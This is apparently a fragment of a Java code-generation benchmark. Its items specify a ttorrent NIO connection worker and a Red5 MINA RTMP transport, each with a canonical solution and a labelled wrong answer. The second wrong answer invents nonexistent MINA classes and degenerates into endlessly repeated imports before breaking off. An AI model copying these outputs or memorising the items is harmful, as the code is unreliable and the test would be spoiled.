    "Instruction": "Task Description: Implement a Java class that manages TCP client connections using Java NIO (Non-blocking I/O) techniques, including connection establishment, data writing, and cleanup operations.\n\nClass Description: ConnectionWorker is a Runnable class that handles asynchronous TCP client connections using Java NIO. It manages connection tasks through a selector pattern, processes write operations, and performs periodic cleanup of stale connections. The class supports concurrent operations through queue-based task management.\n\nAttributes:\n- logger: Logger - SLF4J logger for logging operations\n- stop: boolean - Volatile flag to control thread execution\n- selector: Selector - NIO selector for managing channels\n- myConnectQueue: BlockingQueue<ConnectTask> - Queue for pending connection tasks\n- myWriteQueue: BlockingQueue<WriteTask> - Queue for pending write operations\n- mySemaphore: Semaphore - Controls access to the worker thread\n- myKeyProcessors: List<KeyProcessor> - Processors for handling different channel operations\n- myTimeService: TimeService - Provides time-related functionality\n- lastCleanupTime: long - Timestamp of last cleanup operation\n- mySelectorTimeoutMillis: int - Timeout for selector operations\n- myCleanupTimeoutMillis: long - Timeout between cleanup operations\n- myCleanupProcessor: CleanupProcessor - Handles connection cleanup\n- myNewConnectionAllower: NewConnectionAllower - Controls new connection allowance\n\nMethods:\n- run(): void - Main execution method implementing Runnable interface\n- connectToPeersFromQueue(): void - Processes pending connection tasks from queue\n- processSelectedKeys(): void - Processes all ready selection keys\n- processSelectedKey(SelectionKey): void - Processes a single selection key\n- offerConnect(ConnectTask, int, TimeUnit): boolean - Adds new connection task to queue\n- addTaskToQueue(T, int, TimeUnit, BlockingQueue<T>): boolean - Generic method for adding tasks to queues\n- processWriteTasks(): void - Processes pending write operations (implied from code context)\n- cleanup(): void - Performs cleanup operations (implied from code context)\n- needRunCleanup(): boolean - Determines if cleanup is needed (implied from code context)",
    "Canonical_solution": "import com.turn.ttorrent.common.LoggerUtils;\nimport com.turn.ttorrent.common.TimeService;\nimport com.turn.ttorrent.common.TorrentLoggerFactory;\nimport com.turn.ttorrent.network.keyProcessors.CleanupProcessor;\nimport com.turn.ttorrent.network.keyProcessors.KeyProcessor;\nimport org.slf4j.Logger;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.*;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.Semaphore;\nimport java.util.concurrent.TimeUnit;\n\npublic class ConnectionWorker implements Runnable {\n\n  private static final Logger logger = TorrentLoggerFactory.getLogger(ConnectionWorker.class);\n  private static final String SELECTOR_THREAD_NAME = \"Torrent channels manager thread\";\n  private volatile boolean stop = false;\n  private final Selector selector;\n  private final BlockingQueue<ConnectTask> myConnectQueue;\n  private final BlockingQueue<WriteTask> myWriteQueue;\n  private final Semaphore mySemaphore;\n  private final List<KeyProcessor> myKeyProcessors;\n  private final TimeService myTimeService;\n  private long lastCleanupTime;\n  private volatile int mySelectorTimeoutMillis;\n  private volatile long myCleanupTimeoutMillis;\n  private final CleanupProcessor myCleanupProcessor;\n  private final NewConnectionAllower myNewConnectionAllower;\n\n  public ConnectionWorker(Selector selector,\n                   List<KeyProcessor> keyProcessors,\n                   int selectorTimeoutMillis,\n                   int cleanupTimeoutMillis,\n                   TimeService timeService,\n                   CleanupProcessor cleanupProcessor,\n                   NewConnectionAllower myNewConnectionAllower) {\n    this.selector = selector;\n    this.myTimeService = timeService;\n    this.lastCleanupTime = timeService.now();\n    this.mySelectorTimeoutMillis = selectorTimeoutMillis;\n    this.myCleanupTimeoutMillis = cleanupTimeoutMillis;\n    this.myCleanupProcessor = cleanupProcessor;\n    this.myNewConnectionAllower = myNewConnectionAllower;\n    this.mySemaphore = new Semaphore(1);\n    this.myConnectQueue = new LinkedBlockingQueue<ConnectTask>(100);\n    this.myKeyProcessors = keyProcessors;\n    this.myWriteQueue = new LinkedBlockingQueue<WriteTask>(5000);\n  }\n\n  @Override\n  public void run() {\n    try {\n      mySemaphore.acquire();\n    } catch (InterruptedException e) {\n      return;\n    }\n\n    final String oldName = Thread.currentThread().getName();\n\n    try {\n      Thread.currentThread().setName(SELECTOR_THREAD_NAME);\n\n      while (!stop && (!Thread.currentThread().isInterrupted())) {\n        try {\n          logger.trace(\"try select keys from selector\");\n          int selected;\n          try {\n            selected = selector.select(mySelectorTimeoutMillis);\n          } catch (ClosedSelectorException e) {\n            break;\n          }\n          connectToPeersFromQueue();\n          processWriteTasks();\n          logger.trace(\"select keys from selector. Keys count is \" + selected);\n          if (selected != 0) {\n            processSelectedKeys();\n          }\n          if (needRunCleanup()) {\n            cleanup();\n          }\n        } catch (Throwable e) {\n          LoggerUtils.warnAndDebugDetails(logger, \"unable to select channel keys. Error message {}\", e.getMessage(), e);\n        }\n      }\n    } catch (Throwable e) {\n      LoggerUtils.errorAndDebugDetails(logger, \"exception on cycle iteration\", e);\n    } finally {\n      Thread.currentThread().setName(oldName);\n      mySemaphore.release();\n    }\n  }\n\n  private void connectToPeersFromQueue() {\n    ConnectTask connectTask;\n    while ((connectTask = myConnectQueue.poll()) != null) {\n      if (stop || Thread.currentThread().isInterrupted()) {\n        return;\n      }\n      logger.debug(\"try connect to peer. Connect task is {}\", connectTask);\n      try {\n        SocketChannel socketChannel = SocketChannel.open();\n        socketChannel.configureBlocking(false);\n        socketChannel.register(selector, SelectionKey.OP_CONNECT, connectTask);\n        socketChannel.connect(new InetSocketAddress(connectTask.getHost(), connectTask.getPort()));\n      } catch (IOException e) {\n        LoggerUtils.warnAndDebugDetails(logger, \"unable connect. Connect task is {}\", connectTask, e);\n      }\n    }\n  }\n\n  private void processSelectedKeys() {\n    Set<SelectionKey> selectionKeys = selector.selectedKeys();\n    for (SelectionKey key : selectionKeys) {\n      if (stop || Thread.currentThread().isInterrupted()) {\n        return;\n      }\n      try {\n        processSelectedKey(key);\n      } catch (Exception e) {\n        logger.warn(\"error {} in processing key. Close channel {}\", e.getMessage(), key.channel());\n        logger.debug(\"\", e);\n        try {\n          key.channel().close();\n        } catch (IOException ioe) {\n          LoggerUtils.errorAndDebugDetails(logger, \"unable close bad channel\", ioe);\n        }\n      }\n    }\n    selectionKeys.clear();\n  }\n\n  private void processSelectedKey(SelectionKey key) throws IOException {\n    logger.trace(\"try process key for channel {}\", key.channel());\n    myCleanupProcessor.processSelected(key);\n    if (!key.channel().isOpen()) {\n      key.cancel();\n      return;\n    }\n    for (KeyProcessor keyProcessor : myKeyProcessors) {\n      if (keyProcessor.accept(key)) {\n        keyProcessor.process(key);\n      }\n    }\n  }\n\n  public boolean offerConnect(ConnectTask connectTask, int timeout, TimeUnit timeUnit) {\n    if (!myNewConnectionAllower.isNewConnectionAllowed()) {\n      logger.info(\"can not add connect task {} to queue. New connection is not allowed\", connectTask);\n      return false;\n    }\n    return addTaskToQueue(connectTask, timeout, timeUnit, myConnectQueue);\n  }\n\n  private <T> boolean addTaskToQueue(T task, int timeout, TimeUnit timeUnit, BlockingQueue<T> queue) {\n    try {\n      if (queue.offer(task, timeout, timeUnit)) {\n        logger.trace(\"added task {}. Wake up selector\", task);\n        selector.wakeup();\n        return true;\n      }\n    } catch (InterruptedException e) {\n      logger.debug(\"Task {} interrupted before was added to queue\", task);\n    }\n    logger.debug(\"Task {} was not added\", task);\n    return false;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.Semaphore;\nimport java.util.concurrent.TimeUnit;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class ConnectionWorker implements Runnable {\n    private final Logger logger = LoggerFactory.getLogger(ConnectionWorker.class);\n    private volatile boolean stop;\n    private final Selector selector;\n    private final BlockingQueue<ConnectTask> myConnectQueue;\n    private final BlockingQueue<WriteTask> myWriteQueue;\n    private final Semaphore mySemaphore;\n    private final List<KeyProcessor> myKeyProcessors;\n    private final TimeService myTimeService;\n    private long lastCleanupTime;\n    private final int mySelectorTimeoutMillis;\n    private final long myCleanupTimeoutMillis;\n    private final CleanupProcessor myCleanupProcessor;\n    private final NewConnectionAllower myNewConnectionAllower;\n\n    public ConnectionWorker(Selector selector, BlockingQueue<ConnectTask> connectQueue, BlockingQueue<WriteTask> writeQueue, \n                            Semaphore semaphore, List<KeyProcessor> keyProcessors, TimeService timeService, \n                            int selectorTimeout, long cleanupTimeout, CleanupProcessor cleanupProcessor, NewConnectionAllower newConnectionAllower) {\n        this.selector = selector;\n        this.myConnectQueue = connectQueue;\n        this.myWriteQueue = writeQueue;\n        this.mySemaphore = semaphore;\n        this.myKeyProcessors = keyProcessors;\n        this.myTimeService = timeService;\n        this.mySelectorTimeoutMillis = selectorTimeout;\n        this.myCleanupTimeoutMillis = cleanupTimeout;\n        this.myCleanupProcessor = cleanupProcessor;\n        this.myNewConnectionAllower = newConnectionAllower;\n        lastCleanupTime = myTimeService.currentTimeMillis();\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (!stop) {\n                mySemaphore.acquire();\n                try {\n                    connectToPeersFromQueue();\n                    processSelectedKeys();\n                } finally {\n                    mySemaphore.release();\n                }\n                if (needRunCleanup()) {\n                    cleanup();\n                }\n            }\n        } catch (Exception e) {\n            logger.error(\"Error in ConnectionWorker\", e);\n        } finally {\n            try {\n                selector.close();\n            } catch (IOException e) {\n                logger.warn(\"Failed to close selector\", e);\n            }\n        }\n    }\n\n    private void connectToPeersFromQueue() throws IOException {\n        while (!myConnectQueue.isEmpty()) {\n            ConnectTask task = myConnectQueue.poll();\n            if (task == null) break;\n            if (myNewConnectionAllower.allow()) {\n                SocketChannel channel = SocketChannel.open();\n                channel.configureBlocking(false);\n                channel.connect(new InetSocketAddress(task.getHost(), task.getPort()));\n                channel.register(selector, SelectionKey.OP_CONNECT, task);\n                logger.info(\"Connecting to {}\", task.getHost());\n            } else {\n                logger.warn(\"Connection to {} is disallowed\", task.getHost());\n            }\n        }\n    }\n\n    private void processSelectedKeys() throws IOException {\n        Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n        while (keys.hasNext()) {\n            SelectionKey key = keys.next();\n            keys.remove();\n            processSelectedKey(key);\n        }\n    }\n\n    private void processSelectedKey(SelectionKey key) throws IOException {\n        if (key.isConnectable()) {\n            SocketChannel channel = (SocketChannel) key.channel();\n            if (channel.isConnectionPending()) {\n                channel.finishConnect();\n                key.interestOps(SelectionKey.OP_WRITE);\n                logger.info(\"Connected to {}\", ((ConnectTask) key.attachment()).getHost());\n            }\n        } else if (key.isWritable()) {\n            processWriteTasks();\n        } else if (key.isReadable()) {\n            // Handle read operations if needed\n        }\n    }\n\n    private boolean offerConnect(ConnectTask task, int timeout, TimeUnit unit) {\n        return myConnectQueue.offer(task, timeout, unit);\n    }\n\n    private <T> boolean addTaskToQueue(T task, int timeout, TimeUnit unit, BlockingQueue<T> queue) {\n        return queue.offer(task, timeout, unit);\n    }\n\n    private void processWriteTasks() throws IOException {\n        while (!myWriteQueue.isEmpty()) {\n            WriteTask task = myWriteQueue.poll();\n            if (task == null) break;\n            SocketChannel channel = (SocketChannel) task.getChannel();\n            ByteBuffer buffer = ByteBuffer.wrap(task.getData());\n            while (buffer.hasRemaining()) {\n                int result = channel.write(buffer);\n                if (result == 0) break;\n            }\n            logger.debug(\"Wrote {} bytes to {}\", task.getData().length, task.getChannel());\n        }\n    }\n\n    private void cleanup() {\n        long currentTime = myTimeService.currentTimeMillis();\n        if (currentTime - lastCleanupTime > myCleanupTimeoutMillis) {\n            myCleanupProcessor.process();\n            lastCleanupTime = currentTime;\n        }\n    }\n\n    private boolean needRunCleanup() {\n        return myTimeService.currentTimeMillis() - lastCleanupTime > myCleanupTimeoutMillis;\n    }\n}"
  },
  {
    "Task_id": 437,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Apache MINA framework for RTMP (Real-Time Messaging Protocol) transport, with configurable network settings and JMX monitoring capabilities.\n\nClass Description: RTMPMinaTransport is a TCP server implementation using Apache MINA that handles RTMP connections. It provides configurable network parameters, thread pooling options, and JMX monitoring capabilities. The class manages server lifecycle (start/stop), connection handling, and performance statistics.\n\nAttributes:\n\n- log: Logger - Logger instance for the class\n- executor: ThreadPoolExecutor - Thread pool executor for custom acceptor mode\n- acceptor: SocketAcceptor - MINA socket acceptor instance\n- addresses: Set<String> - Set of IP addresses and ports to bind to\n- ioHandler: IoHandlerAdapter - Handler for IO events\n- ioThreads: int - Number of IO threads (default: 2 * available processors)\n- serviceManagerObjectName: ObjectName - JMX MBean object name\n- stats: IoServiceStatistics - MINA service statistics\n- enableMinaLogFilter: boolean - Flag to enable MINA logging filter\n- enableMinaMonitor: boolean - Flag to enable JMX monitoring\n- minaPollInterval: int - JMX poll interval in ms (default: 1000)\n- tcpNoDelay: boolean - TCP_NODELAY flag (default: true)\n- useHeapBuffers: boolean - Use heap buffers flag (default: true)\n- sendBufferSize: int - Socket send buffer size (default: 65536)\n- receiveBufferSize: int - Socket receive buffer size (default: 65536)\n- readerIdleTime: int - Reader idle time in seconds (default: 2)\n- trafficClass: int - IP traffic class (default: 0x08 | 0x10)\n- backlog: int - Connection backlog (default: 32)\n- thoughputCalcInterval: int - Throughput calculation interval (default: 1)\n- executorKeepAliveTime: long - Thread keep-alive time in ms (default: 60000)\n- enableDefaultAcceptor: boolean - Use default acceptor flag (default: true)\n- initialPoolSize: int - Initial thread pool size (default: 0)\n- maxPoolSize: int - Maximum thread pool size (default: processors + 1)\n- maxProcessorPoolSize: int - Maximum processor pool size (default: 16)\n- keepAlive: boolean - Socket keep-alive flag\n\nMethods:\n\n- start() throws Exception -> void - Starts the TCP server with configured settings\n- stop() -> void - Stops the TCP server and cleans up resources\n- setAddress(String address) -> void - Adds a single address to bind to\n- setAddresses(List<String> addrs) -> void - Adds multiple addresses to bind to\n- setIoHandler(IoHandlerAdapter rtmpIOHandler) -> void - Sets the IO handler\n- setIoThreads(int ioThreads) -> void - Sets number of IO threads\n- setSendBufferSize(int sendBufferSize) -> void - Sets send buffer size\n- setReceiveBufferSize(int receiveBufferSize) -> void - Sets receive buffer size\n- setTrafficClass(int trafficClass) -> void - Sets IP traffic class\n- setBacklog(int backlog) -> void - Sets connection backlog\n- setThoughputCalcInterval(int thoughputCalcInterval) -> void - Sets throughput calculation interval\n- setExecutorKeepAliveTime(long executorKeepAliveTime) -> void - Sets thread keep-alive time\n- setEnableDefaultAcceptor(boolean enableDefaultAcceptor) -> void - Sets default acceptor flag\n- setInitialPoolSize(int initialPoolSize) -> void - Sets initial thread pool size\n- setMaxPoolSize(int maxPoolSize) -> void - Sets maximum thread pool size\n- setMaxProcessorPoolSize(int maxProcessorPoolSize) -> void - Sets maximum processor pool size\n- setTcpNoDelay(boolean tcpNoDelay) -> void - Sets TCP_NODELAY flag\n- setKeepAlive(boolean keepAlive) -> void - Sets socket keep-alive flag\n- setUseHeapBuffers(boolean useHeapBuffers) -> void - Sets heap buffers flag\n- setEnableMinaLogFilter(boolean enableMinaLogFilter) -> void - Enables/disables MINA logging filter\n- setEnableMinaMonitor(boolean enableMinaMonitor) -> void - Enables/disables JMX monitoring\n- setMinaPollInterval(int minaPollInterval) -> void - Sets JMX poll interval\n- setReaderIdleTime(int readerIdleTime) -> void - Sets reader idle time\n- isEnableMinaLogFilter() -> boolean - Returns MINA logging filter status\n- getAddress() -> String - Returns bound addresses as string",
    "Canonical_solution": "import java.lang.management.ManagementFactory;\nimport java.net.InetSocketAddress;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\nimport javax.management.MBeanServer;\nimport javax.management.ObjectName;\nimport javax.management.StandardMBean;\n\nimport org.apache.mina.core.buffer.IoBuffer;\nimport org.apache.mina.core.buffer.SimpleBufferAllocator;\nimport org.apache.mina.core.filterchain.DefaultIoFilterChainBuilder;\nimport org.apache.mina.core.service.AbstractIoService;\nimport org.apache.mina.core.service.IoHandlerAdapter;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.SimpleIoProcessorPool;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.SocketAcceptor;\nimport org.apache.mina.transport.socket.SocketSessionConfig;\nimport org.apache.mina.transport.socket.nio.NioProcessor;\nimport org.apache.mina.transport.socket.nio.NioSession;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.red5.server.jmx.mxbeans.RTMPMinaTransportMXBean;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class RTMPMinaTransport implements RTMPMinaTransportMXBean {\n\n    private static final Logger log = LoggerFactory.getLogger(RTMPMinaTransport.class);\n\n    private ThreadPoolExecutor executor;\n\n    protected SocketAcceptor acceptor;\n\n    protected Set<String> addresses = new HashSet<String>();\n\n    protected IoHandlerAdapter ioHandler;\n\n    protected int ioThreads = Runtime.getRuntime().availableProcessors() * 2;\n\n    protected ObjectName serviceManagerObjectName;\n\n    protected IoServiceStatistics stats;\n\n    public void start() throws Exception {\n        IoBuffer.setUseDirectBuffer(!useHeapBuffers);\n        if (useHeapBuffers) {\n            IoBuffer.setAllocator(new SimpleBufferAllocator());\n        }\n        if (enableDefaultAcceptor) {\n            acceptor = new NioSocketAcceptor(ioThreads);\n        } else {\n            SimpleIoProcessorPool<NioSession> pool = new SimpleIoProcessorPool<NioSession>(NioProcessor.class, maxProcessorPoolSize);\n            executor = new ThreadPoolExecutor(initialPoolSize, maxPoolSize, executorKeepAliveTime, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<Runnable>(Short.MAX_VALUE));\n            acceptor = new NioSocketAcceptor(executor, pool);\n        }\n        if (enableMinaLogFilter) {\n            DefaultIoFilterChainBuilder chain = acceptor.getFilterChain();\n            LoggingFilter logFilter = new LoggingFilter(RTMPMinaTransport.class);\n            chain.addLast(\"logger\", logFilter);\n        }\n        acceptor.setCloseOnDeactivation(true);\n        acceptor.setHandler(ioHandler);\n        acceptor.setBacklog(backlog);\n        SocketSessionConfig sessionConf = acceptor.getSessionConfig();\n        sessionConf.setReuseAddress(true);\n        sessionConf.setTcpNoDelay(tcpNoDelay);\n        sessionConf.setSendBufferSize(sendBufferSize);\n        sessionConf.setReceiveBufferSize(receiveBufferSize);\n        sessionConf.setMaxReadBufferSize(receiveBufferSize);\n        sessionConf.setThroughputCalculationInterval(thoughputCalcInterval);\n        sessionConf.setReaderIdleTime(readerIdleTime);\n        sessionConf.setKeepAlive(keepAlive);\n        if (trafficClass != -1) {\n            sessionConf.setTrafficClass(trafficClass);\n        }\n        acceptor.setReuseAddress(true);\n        Set<InetSocketAddress> socketAddresses = new HashSet<InetSocketAddress>();\n        for (String addr : addresses) {\n            if (addr.indexOf(':') != -1) {\n                String[] parts = addr.split(\":\");\n                socketAddresses.add(new InetSocketAddress(parts[0], Integer.valueOf(parts[1])));\n            } else {\n                socketAddresses.add(new InetSocketAddress(addr, 1935));\n            }\n        }\n        acceptor.bind(socketAddresses);\n        if (enableMinaMonitor) {\n            stats = new IoServiceStatistics((AbstractIoService) acceptor);\n            stats.setThroughputCalculationInterval(minaPollInterval);\n            MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();\n            try {\n                serviceManagerObjectName = new ObjectName(\"org.red5.server:type=RTMPMinaTransport\");\n                mbs.registerMBean(new StandardMBean(this, RTMPMinaTransportMXBean.class, true), serviceManagerObjectName);\n            } catch (Exception e) {\n                log.warn(\"Error on jmx registration\", e);\n            }\n        }\n    }\n\n    public void stop() {\n        acceptor.unbind();\n        if (!enableDefaultAcceptor) {\n            executor.shutdownNow();\n        }\n        acceptor.dispose(false);\n        if (serviceManagerObjectName != null) {\n            MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();\n            try {\n                mbs.unregisterMBean(serviceManagerObjectName);\n            } catch (Exception e) {\n                log.warn(\"Error on jmx unregistration\", e);\n            }\n        }\n    }\n\n    public void setAddress(String address) {\n        addresses.add(address);\n    }\n\n    public void setAddresses(List<String> addrs) {\n        for (String addr : addrs) {\n            addresses.add(addr);\n        }\n    }\n\n    public void setIoHandler(IoHandlerAdapter rtmpIOHandler) {\n        this.ioHandler = rtmpIOHandler;\n    }\n\n    public void setIoThreads(int ioThreads) {\n        this.ioThreads = ioThreads;\n    }\n\n    protected boolean enableMinaLogFilter;\n\n    protected boolean enableMinaMonitor;\n\n    protected int minaPollInterval = 1000;\n\n    protected boolean tcpNoDelay = true;\n\n    protected boolean useHeapBuffers = true;\n\n    protected int sendBufferSize = 65536;\n\n    protected int receiveBufferSize = 65536;\n\n    private int readerIdleTime = 2;\n\n    private int trafficClass = 0x08 | 0x10;\n\n    private int backlog = 32;\n\n    private int thoughputCalcInterval = 1;\n\n    private long executorKeepAliveTime = 60000;\n\n    private boolean enableDefaultAcceptor = true;\n\n    private int initialPoolSize = 0;\n\n    private int maxPoolSize = Runtime.getRuntime().availableProcessors() + 1;\n\n    private int maxProcessorPoolSize = 16;\n\n    private boolean keepAlive;\n\n    public void setSendBufferSize(int sendBufferSize) {\n        this.sendBufferSize = sendBufferSize;\n    }\n\n    public void setReceiveBufferSize(int receiveBufferSize) {\n        this.receiveBufferSize = receiveBufferSize;\n    }\n\n    public void setTrafficClass(int trafficClass) {\n        this.trafficClass = trafficClass;\n    }\n\n    public void setBacklog(int backlog) {\n        this.backlog = backlog;\n    }\n\n    public void setThoughputCalcInterval(int thoughputCalcInterval) {\n        this.thoughputCalcInterval = thoughputCalcInterval;\n    }\n\n    public void setExecutorKeepAliveTime(long executorKeepAliveTime) {\n        this.executorKeepAliveTime = executorKeepAliveTime;\n    }\n\n    public void setEnableDefaultAcceptor(boolean enableDefaultAcceptor) {\n        this.enableDefaultAcceptor = enableDefaultAcceptor;\n    }\n\n    public void setInitialPoolSize(int initialPoolSize) {\n        this.initialPoolSize = initialPoolSize;\n    }\n\n    public void setMaxPoolSize(int maxPoolSize) {\n        this.maxPoolSize = maxPoolSize;\n    }\n\n    public void setMaxProcessorPoolSize(int maxProcessorPoolSize) {\n        this.maxProcessorPoolSize = maxProcessorPoolSize;\n    }\n\n    public void setTcpNoDelay(boolean tcpNoDelay) {\n        this.tcpNoDelay = tcpNoDelay;\n    }\n\n    public void setKeepAlive(boolean keepAlive) {\n        this.keepAlive = keepAlive;\n    }\n\n    public void setUseHeapBuffers(boolean useHeapBuffers) {\n        this.useHeapBuffers = useHeapBuffers;\n    }\n\n    public boolean isEnableMinaLogFilter() {\n        return enableMinaLogFilter;\n    }\n\n    public void setEnableMinaLogFilter(boolean enableMinaLogFilter) {\n        this.enableMinaLogFilter = enableMinaLogFilter;\n    }\n\n    public void setEnableMinaMonitor(boolean enableMinaMonitor) {\n        this.enableMinaMonitor = enableMinaMonitor;\n    }\n\n    public void setMinaPollInterval(int minaPollInterval) {\n        this.minaPollInterval = minaPollInterval;\n    }\n\n    public void setReaderIdleTime(int readerIdleTime) {\n        this.readerIdleTime = readerIdleTime;\n    }\n\n    public String getAddress() {\n        return addresses.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 11,
    "wrong_result": "```java\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoHandlerAdapter;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.core.filterchain.FilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.filterchain.DefaultIoFilterChainBuilder;\nimport org.apache.mina.core.service.IoServiceConfiguration;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.codec.ProtocolCodecFilter;\nimport org.apache.mina.filter.io.IoBufferedInput;\nimport org.apache.mina.filter.io.IoBufferedOutput;\nimport org.apache.mina.filter.ssl.SslFilter;\nimport org.apache.mina.filter.timeout.IdleStateHandler;\nimport org.apache.mina.filter.codec.textline.TextLineCodecFactory;\nimport org.apache.mina.filter.codec.binary.LineBasedFrameDecoder;\nimport org.apache.mina.filter.codec.binary.DelimiterBasedFrameDecoder;\nimport org.apache.mina.filter.codec.binary.MiniJsonFrameDecoder;\nimport org.apache.mina.filter.codec.binary.MiniJsonFrameEncoder;\nimport org.apache.mina.filter.codec.binary.StringToBinaryEncoder;\nimport org.apache.mina.filter.codec.binary.BinaryToTextEncoder;\nimport org.apache.mina.filter.codec.binary.CsvFrameDecoder;\nimport org.apache.mina.filter.codec.binary.CsvFrameEncoder;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport 